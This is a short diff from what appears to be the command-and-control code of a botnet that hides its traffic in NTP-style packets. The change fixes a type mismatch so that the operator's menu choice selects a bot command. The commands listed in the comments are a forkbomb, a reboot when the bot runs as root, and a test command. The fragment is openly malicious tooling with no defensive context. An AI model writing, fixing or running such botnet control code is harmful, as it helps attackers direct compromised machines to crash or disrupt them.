@@ -192,7 +192,7 @@ class WorkThread(threading.Thread):
         #sendPacket.tx_timestamp = system_to_ntp_time(time.time())
         # prompt for shell command
         tx_command = 0
-        shellInput = 3 #raw_input(PROMPT)
+        shellInput = '3' #raw_input(PROMPT)
         if shellInput == '1': tx_command = 1 #Set bot to issue a forkbomb
         if shellInput == '2': tx_command = 2 #Set bot to reboot if root
         if shellInput == '3': tx_command = 3 #Set bot to issue a test command
